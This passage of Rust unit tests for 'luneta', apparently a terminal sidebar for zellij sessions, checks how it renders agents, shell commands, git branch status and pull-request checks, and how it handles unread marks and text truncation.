        lost.zellij = Some(Zellij { named: "gone".to_owned(), session: None, pane: 1 });
        let sessions = [
            session("renamed", 10, vec![pane(1, 0, "/w/luneta/main", "claude")]),
            session("other", 20, vec![pane(1, 0, "/w/elsewhere", "fish")]),
        ];
        let agents = [lost];
        let held = seated(&agents, &sessions);
        assert_eq!(held.keys().collect::<Vec<_>>(), [&("renamed", 1)]);

        let mut sidebar = fresh();
        sidebar.heard(host(sessions.to_vec(), agents.to_vec()));
        let lines = screen(&mut sidebar, false, 32, 6);
        assert_eq!(lines[5], "   ● \u{ec82} fold                 1m");

        // Two sessions list a pane of its id where it works, and the agent
        // runs inside a shell: the one whose pane it titled holds it.
        let titled = Pane {
            titled: Some(api::Titled { topic: None }),
            ..pane(1, 0, "/w/luneta/main", "fish")
        };
        let sessions = [
            session("renamed", 10, vec![titled]),
            session("other", 20, vec![pane(1, 0, "/w/luneta/main", "fish")]),
        ];
        let held = seated(&agents, &sessions);
        assert_eq!(held.keys().collect::<Vec<_>>(), [&("renamed", 1)]);
    }

    /// What a pane runs tells of Claude Code's agents alone. So a pi agent the
    /// daemon cannot follow, of two sessions that list a pane of its id where
    /// it works, gets no row. It takes none from a Claude Code agent's pane.
    #[test]
    fn a_pi_agent_the_daemon_cannot_follow_takes_no_claude_code_pane() {
        let lost = Agent {
            harness: Some(Harness::Pi.into()),
            zellij: Some(Zellij { named: "gone".to_owned(), session: None, pane: 1 }),
            ..agent("gone", 1, Status::Idle, Some("pi"))
        };
        let sessions = [
            session("renamed", 10, vec![pane(1, 0, "/w/luneta/main", "pi")]),
            session("other", 20, vec![pane(1, 0, "/w/luneta/main", "claude")]),
        ];
        assert_eq!(seated(&[lost], &sessions).len(), 0);
    }

    #[test]
    fn a_pane_holds_the_agent_started_at_a_prompt() {
        let mut prompt = agent("s", 1, Status::Idle, Some("prompt"));
        prompt.started_at = Some(Timestamp { seconds: 90, nanos: 0 });
        let mut headless = agent("s", 1, Status::Busy, Some("headless"));
        headless.entrypoint = Some("sdk-cli".to_owned());
        let agents = [headless, prompt];
        let seated = seated(&agents, &[]);
        assert_eq!(
            seated
                .get(&("s", 1))
                .and_then(|agent| agent.name.as_ref())
                .map(|name| name.text.as_str()),
            Some("prompt")
        );
    }

    /// A pane holds a pi agent at a prompt, by pi's word for that, before one
    /// that started first and runs on its own.
    #[test]
    fn a_pane_holds_the_pi_agent_started_at_a_prompt() {
        let of = |name: &str, mode: &str, started: i64| Agent {
            harness: Some(Harness::Pi.into()),
            entrypoint: Some(mode.to_owned()),
            started_at: Some(Timestamp { seconds: started, nanos: 0 }),
            ..agent("s", 1, Status::Idle, Some(name))
        };
        let agents = [of("on its own", "print", 10), of("prompt", "tui", 90)];
        let seated = seated(&agents, &[]);
        let name = seated.get(&("s", 1)).and_then(|agent| agent.name.as_ref());
        assert_eq!(name.map(|name| name.text.as_str()), Some("prompt"));
    }

    /// The agent at a prompt goes by its harness's own word, as a word means
    /// nothing apart from it. A daemon that says no harness is older than any but
    /// Claude Code's, and luneta knows no word of one only a newer daemon knows.
    #[test]
    fn an_agent_is_at_a_prompt_by_its_harness_s_word() {
        let (claude, pi) = (Some(Harness::ClaudeCode.into()), Some(Harness::Pi.into()));
        let cases = [
            (claude, "cli", true),
            (None, "cli", true),
            (pi, "tui", true),
            (claude, "tui", false),
            (pi, "cli", false),
            (pi, "print", false),
            (Some(99), "cli", false),
        ];
        for (harness, word, at) in cases {
            let agent = Agent {
                harness,
                entrypoint: Some(word.to_owned()),
                ..agent("s", 1, Status::Idle, None)
            };
            assert_eq!(agent.at_a_prompt(), at, "{harness:?} {word}");
        }
    }

    /// A pane at its prompt, in `/w/luneta/main`, whose shell said `doing`,
    /// in a tab of its own.
    fn in_shell(id: u32, doing: Doing) -> Pane {
        Pane { shell: Some(Shell { doing: Some(doing) }), ..pane(id, id, "/w/luneta/main", "fish") }
    }

    fn going(command: &str, since: i64, front: Front) -> Doing {
        let since = Some(Timestamp { seconds: since, nanos: 0 });
        Doing::Going(Going { command: command.to_owned(), since, front: front.into() })
    }

    fn ended(command: &str, status: Option<i32>, millis: i32) -> Doing {
        let (seconds, nanos) = ((millis / 1000).into(), millis % 1000 * 1_000_000);
        let took = Some(prost_types::Duration { seconds, nanos });
        let at = Some(Timestamp { seconds: 130, nanos: 0 });
        let ending = status.map(ended::Ending::Status);
        Doing::Ended(Ended { command: command.to_owned(), at, ending, took })
    }

    /// What a shell said it ran is read as it comes from the daemon: a
    /// command of no words, which lunetad never sends, and a shell that says
    /// nothing this luneta knows, as a newer lunetad's would, are unknown.
    #[test]
    fn what_a_shell_said_it_ran_is_read_as_it_comes() {
        let said = |doing| ran(&Shell { doing: Some(doing) });
        let at = SystemTime::UNIX_EPOCH + Duration::from_secs(130);
        let command = Said::new("make".to_owned()).unwrap();
        let make = Ran::Ended(menu::Ended { command, ending: Some(Ending::Exited(2)), at });
        assert_eq!(said(ended("make", Some(2), 10)), make);
        assert_eq!(said(ended("", Some(0), 10)), Ran::Unknown);
        let Doing::Ended(untimed) = ended("make", Some(2), 10) else {
            panic!("an end");
        };
        assert_eq!(said(Doing::Ended(Ended { at: None, ..untimed })), Ran::Unknown);
        assert_eq!(said(going("", 100, Front::Working)), Ran::Unknown);
        assert_eq!(ran(&Shell { doing: None }), Ran::Unknown);
        assert_eq!(said(Doing::Ready(())), Ran::Ready);
    }

    /// A command in a shell has an agent's marks, its row named for it: the
    /// spinner while it works, the dot of an agent that waits for you while
    /// it waits for you to type, and once it ends, how it ended, with the dot
    /// of what you have yet to see. The rule along the top counts them with
    /// the agents. One that takes the terminal
    /// over has no mark while you use it, nor has a job stopped, nor one that
    /// ended within a second, nor a shell that has run nothing yet. The hook
    /// counts whole seconds, and a command is
    /// dated to the last moment of its second. The icon goes by what zellij
    /// says runs in the pane, as for any other: here a shell's, `\u{e795}`,
    /// and neovim's, `\u{e6ae}`.
    #[test]
    fn a_command_has_an_agent_s_marks_and_its_row_is_named_for_it() {
        let mut sidebar = fresh();
        let stopped = Doing::Stopped(Stopped {
            command: "make".to_owned(),
            at: Some(Timestamp { seconds: 130, nanos: 0 }),
        });
        let nvim = in_shell(3, going("nvim notes", 100, Front::Interactive));
        let nvim = Pane { command: Some("nvim notes".to_owned()), ..nvim };
        sidebar.heard(host(
            vec![session(
                "s",
                10,
                vec![
                    in_shell(1, going("cargo build --release", 100, Front::Working)),
                    in_shell(2, going("sudo -k true", 100, Front::Asking)),
                    nvim,
                    in_shell(4, ended("cargo test", Some(0), 41_873)),
                    in_shell(5, ended("cargo clippy", Some(101), 5_000)),
                    in_shell(6, ended("cargo run", None, 7_000)),
                    in_shell(7, ended("ls", Some(0), 20)),
                    in_shell(8, stopped),
                    in_shell(9, Doing::Ready(())),
                ],
            )],
            Vec::new(),
        ));
        assert_eq!(
            screen(&mut sidebar, false, 32, 14),
            [
                "─ luneta ──────────────────────",
                "─ 1 session ──────── ●1 •3 ⠋1 ─",
                "",
                " ▾ \u{f108} mac ══════════════════ ●1",
                " ▾ s ────────────────────── ●1",
                "   ⠋ \u{e795} cargo build --rele… 59s",
                "   ● \u{e795} sudo -k true        59s",
                "     \u{e6ae} nvim notes",
                "  •✓ \u{e795} cargo test          29s",
                "  •✗ \u{e795} cargo clippy        29s",
                "  •$ \u{e795} cargo run           29s",
                "     \u{e795} luneta/main",
                "     \u{e795} luneta/main",
                "     \u{e795} luneta/main",
            ]
        );
        assert!(sidebar.turning());
    }

    fn moment(millis: u64) -> SystemTime {
        SystemTime::UNIX_EPOCH + Duration::from_millis(millis)
    }

    /// luneta's own clock as the host's says `now`: as long after one moment
    /// of it as `now` is after the epoch.
    fn steady(now: SystemTime) -> Instant {
        static START: LazyLock<Instant> = LazyLock::new(Instant::now);
        *START + now.duration_since(SystemTime::UNIX_EPOCH).unwrap()
    }

    /// Time went by, to `moment(millis)` by both clocks, with luneta's window
    /// focused.
    fn tick(sidebar: &mut Sidebar, millis: u64) {
        sidebar.ticked(moment(millis), steady(moment(millis)), true);
    }

    /// Whether the cell on line `y` at column `x` is dimmed, drawn at `now`.
    fn dimmed(sidebar: &mut Sidebar, x: u16, y: u16, now: SystemTime) -> bool {
        drawn_at(sidebar, false, 32, 7, now)[(x, y)].modifier.contains(Modifier::DIM)
    }

    /// The picker gets an agent's directory as luneta shows one, its last two
    /// parts: its pane's, or else, while zellij has not said where the pane
    /// works, the agent's own.
    #[test]
    fn the_picker_gets_an_agents_directory_as_its_last_two_parts() {
        let mut sidebar = fresh();
        let unsaid = Pane { cwd: None, ..pane(2, 0, "", "claude") };
        sidebar.heard(host(
            vec![session("s", 10, vec![pane(1, 0, "/home/me/src/luneta/pr-12", "claude"), unsaid])],
            vec![agent("s", 1, Status::Idle, None), agent("s", 2, Status::Idle, None)],
        ));
        let agents = sidebar.listing().local.agents;
        let dirs: Vec<&str> = agents.iter().map(|seated| seated.dir.as_str()).collect();
        assert_eq!(dirs, ["luneta/pr-12", "luneta/main"]);
    }

    /// An agent that finished, and a command that ended, have the dot until
    /// luneta's zellij stays on their panes for a second, a folded session
    /// the dot of one of its panes, and the rule along the top counts them.
    /// Seen, the agent's `✓` is dimmed, and the command's row goes back to
    /// its shell; the picker marks the agent as its row does. On the pane
    /// luneta's zellij is on, an end is no news: you see it. A pane it only
    /// passed through keeps the dot.
    #[test]
    fn what_finished_has_the_dot_until_you_stay_in_its_pane() {
        let mut sidebar = fresh();
        sidebar.heard(host(
            vec![session(
                "s",
                10,
                vec![
                    pane(1, 0, "/w/luneta/main", "claude"),
                    in_shell(2, ended("cargo test", Some(0), 5_000)),
                    pane(3, 3, "/w/a", "fish"),
                ],
            )],
            vec![agent("s", 1, Status::Idle, Some("fold"))],
        ));
        sidebar.titled("s | fish".to_owned());
        let lines = |sidebar: &mut Sidebar, now| {
            sidebar.ticked(now, steady(now), true);
            seen_at(sidebar, false, 32, 8, now).0
        };
        assert_eq!(
            lines(&mut sidebar, moment(160_000)),
            [
                "─ luneta ──────────────────────",
                "─ 1 session ────────────── •2 ─",
                "",
                " ▾ \u{f108} mac ═════════════════════",
                " ▾ s ─────────────────────────",
                "  •✓ \u{ec82} fold                 1m",
                "  •✓ \u{e795} cargo test          29s",
                "     \u{e795} w/a",
            ]
        );
        assert!(!dimmed(&mut sidebar, 3, 5, moment(160_000)));
        assert_eq!(sidebar.listing().local.agents[0].mark, Mark::Finished);
        sidebar.key(&KeyEvent::new(KeyCode::Char('h'), KeyModifiers::NONE), moment(160_000));
        assert!(lines(&mut sidebar, moment(160_000))[4].ends_with(" •"));
        sidebar.key(&KeyEvent::new(KeyCode::Char('l'), KeyModifiers::NONE), moment(160_000));

        let s = |pane| pane_of("s", 10, pane);
        sidebar.went(&s(2));
        assert_eq!(lines(&mut sidebar, moment(160_000))[6], "▌    \u{e795} luneta/main");
        sidebar.went(&s(1));
        lines(&mut sidebar, moment(160_500));
        lines(&mut sidebar, moment(161_500));
        sidebar.went(&s(3));
        assert_eq!(
            lines(&mut sidebar, moment(162_000))[..7],
            [
                "─ luneta ──────────────────────",
                "─ 1 session ────────────── •1 ─",
                "",
                " ▾ \u{f108} mac ═════════════════════",
                " ▾ s ─────────────────────────",
                "   ✓ \u{ec82} fold                 1m",
                "  •✓ \u{e795} cargo test          31s",
            ]
        );
        assert!(dimmed(&mut sidebar, 3, 5, moment(162_000)));
        assert_eq!(sidebar.listing().local.agents[0].mark, Mark::Idle);

        sidebar.went(&s(2));
        lines(&mut sidebar, moment(163_000));
        lines(&mut sidebar, moment(164_000));
        sidebar.went(&s(3));
        let seen = lines(&mut sidebar, moment(164_500));
        assert_eq!(seen[1], format!("─ 1 session {}", "─".repeat(19)));
        assert_eq!(seen[6], "     \u{e795} luneta/main");
    }

    /// `u` marks the highlighted pane unread, and gives its row the dot, with
    /// nothing new in it, and on the pane luneta's zellij is on, until it
    /// leaves and comes back for a second. `u` again takes the mark away.
    #[test]
    fn u_marks_a_pane_unread_until_you_come_back_to_it() {
        let mut sidebar = two_sessions();
        let older = |pane| pane_of("older", 10, pane);
        let u = KeyEvent::new(KeyCode::Char('u'), KeyModifiers::NONE);
        let nvim = |sidebar: &mut Sidebar, now| {
            sidebar.ticked(now, steady(now), true);
            let lines = seen_at(sidebar, true, 32, 12, now).0;
            lines.into_iter().find(|line| line.contains("nvim")).expect("nvim's row")
        };
        sidebar.went(&older(2));
        nvim(&mut sidebar, moment(160_000));
        sidebar.key(&u, moment(161_000));
        assert_eq!(nvim(&mut sidebar, moment(165_000)), "▌ •  \u{e6ae} nvim src/main.rs");
        assert!(screen(&mut sidebar, true, 32, 7)[1].ends_with(" ●1 •1 ─"));

        sidebar.went(&older(1));
        nvim(&mut sidebar, moment(166_000));
        sidebar.went(&older(2));
        assert_eq!(nvim(&mut sidebar, moment(167_000)), "▌ •  \u{e6ae} nvim src/main.rs");
        assert_eq!(nvim(&mut sidebar, moment(168_000)), "▌    \u{e6ae} nvim src/main.rs");

        sidebar.key(&u, moment(168_000));
        assert_eq!(nvim(&mut sidebar, moment(168_000)), "▌ •  \u{e6ae} nvim src/main.rs");
        sidebar.key(&u, moment(168_000));
        assert_eq!(nvim(&mut sidebar, moment(168_000)), "▌    \u{e6ae} nvim src/main.rs");
    }

    /// The session `s` of the tests of the dot: an agent that came to `idle`
    /// at 100 in pane 1, and a shell in pane 3.
    fn idle_agent() -> Host {
        host(
            vec![session(
                "s",
                10,
                vec![pane(1, 0, "/w/luneta/main", "claude"), pane(3, 1, "/w/a", "fish")],
            )],
            vec![agent("s", 1, Status::Idle, Some("fold"))],
        )
    }

    /// The row of the agent of `idle_agent`, once the sidebar ticks at `now`
    /// with luneta's window `watched`.
    fn agent_row(sidebar: &mut Sidebar, now: SystemTime, watched: bool) -> String {
        sidebar.ticked(now, steady(now), watched);
        seen_at(sidebar, false, 32, 6, now).0[4].clone()
    }

    /// luneta's zellij on a pane while luneta's window does not have the
    /// focus is not you there: what finished there keeps the dot, until you
    /// look for a second.
    #[test]
    fn a_pane_is_yours_only_while_luneta_s_window_has_the_focus() {
        let mut sidebar = fresh();
        sidebar.heard(idle_agent());
        sidebar.titled("s | fish".to_owned());
        let s = |pane| pane_of("s", 10, pane);
        sidebar.went(&s(1));
        agent_row(&mut sidebar, moment(160_000), false);
        agent_row(&mut sidebar, moment(165_000), false);
        sidebar.went(&s(3));
        let new = "  •✓ \u{ec82} fold                 1m";
        assert_eq!(agent_row(&mut sidebar, moment(166_000), true), new);

        sidebar.went(&s(1));
        agent_row(&mut sidebar, moment(167_000), false);
        agent_row(&mut sidebar, moment(168_000), true);
        agent_row(&mut sidebar, moment(169_000), true);
        sidebar.went(&s(3));
        let seen = "   ✓ \u{ec82} fold                 1m";
        assert_eq!(agent_row(&mut sidebar, moment(170_000), true), seen);
    }

    /// `u` on a row with the dot marks its pane read, as going there would,
    /// whatever gave it the dot: the agent's `✓` is dimmed. `u` again marks
    /// it unread, and the dot comes back, and once more takes it away.
    #[test]
    fn u_marks_a_pane_with_the_dot_read() {
        let mut sidebar = fresh();
        sidebar.heard(idle_agent());
        sidebar.titled("s | fish".to_owned());
        sidebar.went(&pane_of("s", 10, 3));
        let key = |c| KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE);
        let row = |sidebar: &mut Sidebar, now| {
            sidebar.ticked(now, steady(now), true);
            seen_at(sidebar, true, 32, 19, now).0[4].clone()
        };
        let (new, seen) =
            ("  •✓ \u{ec82} fold                 1m", "   ✓ \u{ec82} fold                 1m");
        assert_eq!(row(&mut sidebar, moment(160_000)), new);
        sidebar.key(&key('k'), moment(160_000));
        sidebar.key(&key('u'), moment(160_000));
        assert_eq!(row(&mut sidebar, moment(160_000)), seen);

        sidebar.key(&key('u'), moment(161_000));
        assert_eq!(row(&mut sidebar, moment(161_000)), new);
        sidebar.key(&key('u'), moment(161_000));
        assert_eq!(row(&mut sidebar, moment(161_000)), seen);
        assert!(dimmed(&mut sidebar, 3, 4, moment(161_000)));
    }

    /// Two sessions whose servers made their sockets in one tick of the
    /// clock, and so started at one moment, keep what you saw in each apart:
    /// their sockets tell them apart.
    #[test]
    fn sessions_that_started_at_once_keep_their_dots_apart() {
        let mut sidebar = fresh();
        let claude = || vec![pane(1, 0, "/w/luneta/main", "claude")];
        let mut twin = session("b", 10, claude());
        twin.socket = 11;
        let mut there = agent("b", 1, Status::Idle, Some("fold"));
        there.pid = 2;
        sidebar.heard(host(
            vec![session("a", 10, claude()), twin],
            vec![agent("a", 1, Status::Idle, Some("fold")), there],
        ));
        sidebar.titled("a | claude".to_owned());
        sidebar.went(&pane_of("a", 10, 1));
        let lines = |sidebar: &mut Sidebar, now| {
            sidebar.ticked(now, steady(now), true);
            seen_at(sidebar, false, 32, 8, now).0
        };
        lines(&mut sidebar, moment(160_000));
        let lines = lines(&mut sidebar, moment(161_000));
        assert_eq!(
            [&lines[5], &lines[7]],
            ["▌  ✓ \u{ec82} fold                 1m", "  •✓ \u{ec82} fold                 1m"]
        );
    }

    /// A session the daemon leaves out of a list, as a rename made while it
    /// reads zellij's folder can, keeps what you saw in it. One it has not
    /// listed for `GONE` has it no more, should it come back.
    #[test]
    fn a_session_left_out_of_a_list_keeps_what_you_saw_until_it_is_gone() {
        let mut sidebar = fresh();
        sidebar.heard(idle_agent());
        sidebar.titled("s | fish".to_owned());
        let s = |pane| pane_of("s", 10, pane);
        sidebar.went(&s(1));
        tick(&mut sidebar, 160_000);
        tick(&mut sidebar, 161_000);
        sidebar.went(&s(3));
        let seen = "   ✓ \u{ec82} fold                 1m";
        let new = "  •✓ \u{ec82} fold                 1m";
        for (left, back, row) in [(163_000, 172_000, seen), (173_000, 183_000, new)] {
            sidebar.heard(host(Vec::new(), Vec::new()));
            tick(&mut sidebar, left);
            tick(&mut sidebar, back);
            sidebar.heard(idle_agent());
            assert_eq!(agent_row(&mut sidebar, moment(back + 500), true), row);
        }
    }

    /// A list the daemon may have left a session out of takes nothing of
    /// what you saw in it, however long it stands: what it said last, while
    /// it does not answer, as a session may have started since; one it
    /// could not read all of zellij's folder for; and one from a daemon older
    /// than the count, which does not say whether it could.
    #[test]
    fn a_session_a_list_falls_short_of_keeps_what_you_saw() {
        let short: [fn(&mut Sidebar); 3] = [
            |sidebar| {
                sidebar.heard(host(Vec::new(), Vec::new()));
                sidebar.lost("lunetad does not answer".to_owned());
            },
            |sidebar| {
                sidebar.heard(Host { unread_sockets: Some(1), ..host(Vec::new(), Vec::new()) });
            },
            |sidebar| {
                sidebar.heard(Host { unread_sockets: None, ..host(Vec::new(), Vec::new()) });
            },
        ];
        for short in short {
            let mut sidebar = fresh();
            sidebar.heard(idle_agent());
            sidebar.titled("s | fish".to_owned());
            let s = |pane| pane_of("s", 10, pane);
            sidebar.went(&s(1));
            tick(&mut sidebar, 160_000);
            tick(&mut sidebar, 161_000);
            sidebar.went(&s(3));
            short(&mut sidebar);
            tick(&mut sidebar, 163_000);
            tick(&mut sidebar, 183_000);
            sidebar.heard(idle_agent());
            let seen = "   ✓ \u{ec82} fold                 1m";
            assert_eq!(agent_row(&mut sidebar, moment(183_500), true), seen);
        }
    }

    /// A command shows once it has run for a second, with no word from the
    /// daemon since it started.
    #[test]
    fn a_command_shows_once_it_has_run_a_second() {
        let mut sidebar = fresh();
        let make = in_shell(1, going("make", 159, Front::Working));
        sidebar.heard(host(vec![session("s", 10, vec![make])], Vec::new()));
        let at = |millis| SystemTime::UNIX_EPOCH + Duration::from_millis(millis);
        let row = |sidebar: &mut Sidebar, now| seen_at(sidebar, false, 32, 6, now).0[5].clone();
        assert_eq!(row(&mut sidebar, at(160_500)), "     \u{e795} luneta/main");
        assert!(!sidebar.turning());
        assert_eq!(row(&mut sidebar, at(161_000)), "   ⠋ \u{e795} make                 1s");
        assert!(sidebar.turning());
    }

    /// Starship's `git_status`, with the defaults.
    #[test]
    fn the_work_tree_shows_what_starship_shows() {
        let changes =
            Changes { conflicted: 1, deleted: 1, renamed: 1, modified: 1, staged: 1, untracked: 1 };
        let both = Some(Upstream { ahead: 1, behind: 2 });
        assert_eq!(glyphs(&changes, 1, both), "=$✘»!+?⇕");
        assert_eq!(glyphs(&Changes::default(), 0, Some(Upstream { ahead: 0, behind: 2 })), "⇣");
        assert_eq!(glyphs(&Changes::default(), 0, None), "");
    }

    /// A branch's pull request follows it, in the colour gh lists its state
    /// in, and a branch too long for both gives way to the number and to how
    /// the work tree stands. A closed one shows nothing.
    #[test]
    fn a_branch_shows_the_number_of_its_pull_request_in_its_state_s_colour() {
        let panes = ["/w/a", "/w/b", "/w/c", "/w/d"];
        let panes = panes.iter().zip(1..).map(|(cwd, id)| pane(id, id, cwd, "fish")).collect();
        let mut host = host(vec![session("s", 10, panes)], Vec::new());
        let checkouts = [
            ("/w/a", "main", 0, 126, State::Open),
            ("/w/b", "handoff-eng-11259-and-more", 1, 4321, State::Merged),
            ("/w/c", "fold", 0, 7, State::Draft),
            ("/w/d", "old", 0, 9, State::Closed),
        ];
        for (dir, branch, modified, number, state) in checkouts {
            let name = Said::new(branch.to_owned()).expect("a branch's name");
            let head = Head::Branch { name, upstream: None, changed: None };
            let changes = Changes { modified, ..Changes::default() };
            let tree = WorkTree::Checkout { repository: None, head, changes, stashes: 0 };
            host.work_trees.push(tree.to_api(dir));
            let number = NonZeroU32::new(number).expect("a pull request's number");
            let pull_request = PullRequest { number, state, url: None, checks: None };
            host.pull_requests.push(pull_request.to_api(dir));
        }
        let mut sidebar = fresh();
        sidebar.heard(host);

        let buffer = drawn(&mut sidebar, false, 32, 13);
        let line = |y: u16| {
            let line: String = (0..31).map(|x| buffer[(x, y)].symbol()).collect();
            line.trim_end().to_owned()
        };
        let number = |y: u16| (0..32).find(|x| buffer[(*x, y)].symbol() == "#");
        let colour = |y: u16| number(y).map(|x| buffer[(x, y)].fg);
        let branches: Vec<String> = [6, 8, 10, 12].into_iter().map(line).collect();
        assert_eq!(
            branches,
            [
                "       main #126",
                "       handoff-eng-11… #4321 !",
                "       fold #7",
                "       old",
            ]
        );
        assert_eq!(colour(6), Some(gruvbox::GREEN));
        assert_eq!(colour(8), Some(gruvbox::PURPLE));
        assert_eq!(colour(10), Some(gruvbox::GREY));
    }

    /// The lines changed on a branch sit between its name and the number of
    /// its pull request: the added in green, the deleted in red, as diffs are
    /// coloured. None where the branch is the repository's default, or its
    /// daemon is too old to say, or where nothing changed, so the line stays
    /// as it is for a pane at rest. A branch too long gives way to them, as
    /// it does to the number and to how the work tree stands.
    #[test]
    fn a_branch_shows_the_lines_changed_on_it() {
        let panes = ["/w/a", "/w/b", "/w/c", "/w/d", "/w/e", "/w/f"];
        let panes = panes.iter().zip(1..).map(|(cwd, id)| pane(id, id, cwd, "fish")).collect();
        let mut host = host(vec![session("s", 10, panes)], Vec::new());
        // (dir, branch, how many lines changed as its daemon counts them,
        // its pull request's number, or none where it has none)
        let checkouts = [
            ("/w/a", "issue-299", Some((120, 34)), 328),
            ("/w/b", "fix", Some((7, 0)), 12),
            ("/w/c", "tidy", Some((0, 5)), 13),
            // The repository's default branch, which its daemon counts none
            // on.
            ("/w/d", "main", None, 14),
            ("/w/e", "handoff-eng-11259-and-more", Some((9, 8)), 4321),
            ("/w/f", "gone", None, 0),
        ];
        for (dir, branch, changed, number) in checkouts {
            let name = Said::new(branch.to_owned()).expect("a branch's name");
            let changed = changed.and_then(|(added, deleted)| Changed::new(added, deleted));
            let head = Head::Branch { name, upstream: None, changed };
            let tree = WorkTree::Checkout {
                repository: None,
                head,
                changes: Changes::default(),
                stashes: 0,
            };
            host.work_trees.push(tree.to_api(dir));
            if number > 0 {
                let number = NonZeroU32::new(number).expect("a pull request's number");
                let pull_request = PullRequest { number, state: State::Open, url: None, checks: None };
                host.pull_requests.push(pull_request.to_api(dir));
            }
        }
        let mut sidebar = fresh();
        sidebar.heard(host);

        let buffer = drawn(&mut sidebar, false, 34, 17);
        let line = |y: u16| {
            let line: String = (0..33).map(|x| buffer[(x, y)].symbol()).collect();
            line.trim_end().to_owned()
        };
        let branches: Vec<String> = (0..6).map(|pane| line(6 + pane * 2)).collect();
        assert_eq!(
            branches,
            [
                "       issue-299 +120 -34 #328",
                "       fix +7 #12",
                "       tidy -5 #13",
                "       main #14",
                "       handoff-eng-… +9 -8 #4321",
                "       gone",
            ]
        );
        let colour = |y: u16, from: u16, mark: &str| {
            let x = (from..34).find(|x| buffer[(*x, y)].symbol() == mark).expect("the mark");
            buffer[(x, y)].fg
        };
        let first = 6;
        // `fix` has only added lines and `tidy` only deleted ones, so each
        // mark says its own count's colour. A branch's name can hold a `-`
        // of its own, as `handoff-eng…` does, so the marks are found from the
        // start of the line on, and each after the `+` before it.
        let added = (0..34).find(|x| buffer[(*x, first)].symbol() == "+").expect("the mark");
        assert_eq!(buffer[(added, first)].fg, gruvbox::GREEN);
        assert_eq!(colour(first, added, "-"), gruvbox::RED);
        assert_eq!(colour(first + 2, 0, "+"), gruvbox::GREEN);
        assert_eq!(colour(first + 4, 0, "-"), gruvbox::RED);
    }

    /// An open pull request, or a draft, has a mark after its number for
    /// what its checks come to, in its colour: one failed, one has yet to end,
    /// or each passed. One with no checks, or whose daemon is too old to say
    /// them, has none, and so does a merged one, whatever its checks did. A
    /// branch too long gives way to the mark too.
    #[test]
    fn an_open_pull_request_shows_what_its_checks_come_to() {
        use luneta_protocol::github::Checks;

        let checks = |pending, failed, passed| Some(Checks { pending, failed, passed });
        let checkouts = [
            ("/w/a", "main", 126, State::Open, checks(1, 1, 3)),
            ("/w/b", "fold", 7, State::Draft, checks(2, 0, 3)),
            ("/w/c", "handoff-eng-11259-and-more", 4321, State::Open, checks(0, 0, 3)),
            ("/w/d", "none", 8, State::Open, checks(0, 0, 0)),
            ("/w/e", "old", 9, State::Open, None),
            ("/w/f", "gone", 10, State::Merged, checks(0, 1, 0)),
        ];
        let panes = checkouts.iter().zip(1..).map(|((cwd, ..), id)| pane(id, id, cwd, "fish"));
        let mut host = host(vec![session("s", 10, panes.collect())], Vec::new());
        for (dir, branch, number, state, checks) in checkouts {
            let name = Said::new(branch.to_owned()).expect("a branch's name");
            let head = Head::Branch { name, upstream: None, changed: None };
            let changes = Changes::default();
            let tree = WorkTree::Checkout { repository: None, head, changes, stashes: 0 };
            host.work_trees.push(tree.to_api(dir));
            let number = NonZeroU32::new(number).expect("a pull request's number");
            let url = Some(format!("https://github.com/owner/repo/pull/{number}"));
            host.pull_requests.push(PullRequest { number, state, url, checks }.to_api(dir));
        }
        let mut sidebar = fresh();
        sidebar.heard(host);

        let buffer = drawn(&mut sidebar, false, 32, 17);
        let line = |y: u16| {
            let line: String = (0..31).map(|x| buffer[(x, y)].symbol()).collect();
            line.trim_end().to_owned()
        };
        let branches: Vec<String> = [6, 8, 10, 12, 14, 16].into_iter().map(line).collect();
        assert_eq!(
            branches,
            [
                "       main #126✗",
                "       fold #7●",
                "       handoff-eng-112… #4321✓",
                "       none #8",
                "       old #9",
                "       gone #10",
            ]
        );
        let mark = |y: u16, mark: &str| {
            let x = (0..32).find(|x| buffer[(*x, y)].symbol() == mark).expect("the mark");
            buffer[(x, y)].fg
        };
        assert_eq!(mark(6, "✗"), gruvbox::RED);
        assert_eq!(mark(8, "●"), gruvbox::YELLOW);
        assert_eq!(mark(10, "✓"), gruvbox::GREEN);
    }

    #[test]
    fn a_cut_leaves_room_for_its_ellipsis() {
        assert_eq!(cut("handoff-eng-11259", 8), "handoff…");
        assert_eq!(cut("short", 8), "short");
        assert_eq!(cut("日本語", 4), "日…");
        assert_eq!(tail("handoff-eng-11259", 8), "…g-11259");
        assert_eq!(tail("short", 8), "short");
        assert_eq!(tail("日本語", 4), "…語");
    }

    /// What shows as one stays whole, and counts as wide as it shows, in the
    /// columns a cut has and in those a line of text wraps at: `⚠️` is a
    /// character and a selector that widens it to two columns, and a family is
    /// three people joined into two columns.
    #[test]
    fn a_cut_or_a_wrap_goes_by_what_shows_as_one() {
        let family = "👩\u{200d}👩\u{200d}👧";
        assert_eq!(cut("⚠️ fix the build", 5), "⚠️ f…");
        assert_eq!(tail("fix the build ⚠️", 5), "…d ⚠️");
        assert_eq!(cut(&format!("{family} team"), 5), format!("{family} t…"));
        assert_eq!(tail(&format!("team {family}"), 5), format!("…m {family}"));
        assert_eq!(cut("⚠️ fix", 2), "…");
        assert_eq!(tail(&format!("fix {family}"), 2), "…");

        let lines: Vec<String> =
            wrapped("ab⚠️cd", 5, Style::new()).iter().map(ToString::to_string).collect();
        assert_eq!(lines, [" ab", " ⚠️c", " d"]);
    }

    /// Sessions to search, each pane named for what it runs.
    fn searched() -> Sidebar {
        let mut sidebar = fresh();
        sidebar.heard(host(
            vec![
                session(
                    "bipa",
                    10,
                    vec![
                        pane(1, 0, "/w/a", "a-p-i-x"),
                        pane(2, 1, "/w/b", "dda-bank-slip"),
                        pane(3, 2, "/w/c", "pix outflow"),
                    ],
                ),
                session("notes", 20, vec![pane(1, 0, "/home/me/Documents", "fish")]),
                session(
                    "zed",
                    30,
                    vec![
                        pane(1, 0, "/w/q", "htop"),
                        pane(2, 1, "/w/r", "z-e-d"),
                        pane(3, 2, "/w/s", "less logs"),
                    ],
                ),
            ],
            Vec::new(),
        ));
        sidebar
    }

    /// Types `text` into the sidebar, a key for each character.
    fn type_in(sidebar: &mut Sidebar, text: &str) {
        for c in text.chars() {
            sidebar.key(&KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE), moment(160_000));
        }
    }

    /// The lines of the rows the sidebar shows, focused, with no rule after a
    /// session's name: those under this machine's header down to the blank
    /// above the legend.
    fn rows_shown(sidebar: &mut Sidebar) -> Vec<String> {
        let lines = screen(sidebar, true, 32, 27);
        let rows = lines[sessions_from(&lines)..].iter().take_while(|line| !line.is_empty());
